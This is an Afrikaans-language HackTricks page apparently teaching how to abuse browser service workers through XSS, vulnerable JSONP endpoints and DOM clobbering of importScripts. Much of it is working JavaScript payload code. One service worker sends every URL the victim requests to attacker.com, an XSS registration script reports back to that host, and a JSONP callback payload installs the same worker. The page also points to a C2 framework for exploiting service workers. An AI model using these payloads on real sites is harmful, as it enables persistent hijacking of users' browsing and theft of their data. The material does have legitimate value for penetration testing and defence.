# Misbruik van Dienswerkers

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

'n **dienswerker** is 'n skrif wat deur jou blaaier in die agtergrond uitgevoer word, apart van enige webblad, wat funksies moontlik maak wat nie 'n webblad of gebruikersinteraksie vereis nie, en dus **aflyn en agtergrondverwerkings** vermoëns verbeter. Gedetailleerde inligting oor dienswerkers kan [hier](https://developers.google.com/web/fundamentals/primers/service-workers) gevind word. Deur dienswerkers binne 'n kwesbare webdomein te misbruik, kan aanvallers beheer verkry oor die slagoffer se interaksies met alle bladsye binne daardie domein.

### Kontroleer vir Bestaande Dienswerkers

Bestaande dienswerkers kan nagegaan word in die **Dienswerkers** afdeling van die **Toepassing** oortjie in **Ontwikkelaarstoestelle**. 'n Ander metode is om [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) te besoek vir 'n meer gedetailleerde weergawe.

### Drukkennisgewings

**Drukkennisgewing toestemmings** het 'n direkte impak op 'n **dienswerker** se vermoë om met die bediener te kommunikeer sonder direkte gebruikersinteraksie. As toestemmings geweier word, beperk dit die dienswerker se potensiaal om 'n voortdurende bedreiging te wees. Omgekeerd, die toekenning van toestemmings verhoog sekuriteitsrisiko's deur die ontvangs en uitvoering van potensiële ontploffings moontlik te maak.

## Aanval om 'n Dienswerker te Skep

Om hierdie kwesbaarheid te misbruik, moet jy vind:

- 'n Manier om **arbitraire JS** lêers na die bediener op te laai en 'n **XSS om die dienswerker** van die opgelaaide JS-lêer te laai
- 'n **kwesbare JSONP versoek** waar jy die **uitset (met arbitraire JS kode)** kan **manipuleer** en 'n **XSS** om die **JSONP met 'n las** te **laai wat 'n kwaadwillige dienswerker** sal **laai**.

In die volgende voorbeeld gaan ek 'n kode voorstel om 'n **nuwe dienswerker** te **registreer** wat na die `fetch` gebeurtenis sal luister en **elke opgevraagde URL na die aanvallers se bediener sal stuur** (dit is die kode wat jy nodig het om te **oplaai** na die **bediener** of te laai via 'n **kwesbare JSONP** antwoord):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
En dit is die kode wat die **werker** sal **registreer** (die kode wat jy moet kan uitvoer deur 'n **XSS** te misbruik). In hierdie geval sal 'n **GET** versoek na die **aanvallers** bediener gestuur word om te **ken** of die **registrasie** van die dienswerker suksesvol was of nie:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
In die geval van die misbruik van 'n kwesbare JSONP-eindpunt, moet jy die waarde binne `var sw` plaas. Byvoorbeeld:
```javascript
var sw =
"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```
Daar is 'n **C2** toegewy aan die **uitbuiting van Service Workers** genoem [**Shadow Workers**](https://shadow-workers.github.io) wat baie nuttig sal wees om hierdie kwesbaarhede te misbruik.

Die **24-uur kasriglyn** beperk die lewe van 'n kwaadwillige of gecompromitteerde **service worker (SW)** tot hoogstens 24 uur na 'n XSS kwesbaarheid regstelling, met die aanname van aanlyn kliëntstatus. Om kwesbaarheid te minimaliseer, kan webwerfoperateurs die SW-skrip se Tyd-Tot-Lewens (TTL) verlaag. Ontwikkelaars word ook aangeraai om 'n [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) te skep vir vinnige deaktivering.

## Misbruik van `importScripts` in 'n SW via DOM Clobbering

Die funksie **`importScripts`** wat vanaf 'n Service Worker aangeroep word, kan **'n skrip van 'n ander domein invoer**. As hierdie funksie aangeroep word met 'n **parameter wat 'n aanvaller kan** verander, kan hy **'n JS-skrip van sy domein invoer** en XSS verkry.

**Dit omseil selfs CSP beskermings.**

**Voorbeeld kwesbare kode:**

- **index.html**
```html
<script>
navigator.serviceWorker.register(
"/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
location.search
)
// attacker controls location.search
</script>
```
- **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```
### Met DOM Clobbering

Vir meer inligting oor wat DOM Clobbering is, kyk:

{{#ref}}
dom-clobbering.md
{{#endref}}

As die URL/domein waar die SW gebruik maak van **`importScripts`** **binne 'n HTML-element** is, is dit **moontlik om dit te verander via DOM Clobbering** om die SW **'n skrip van jou eie domein te laat laai**.

Vir 'n voorbeeld hiervan, kyk na die verwysingskakel.

## Verwysings

- [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{{#include ../../banners/hacktricks-training.md}}
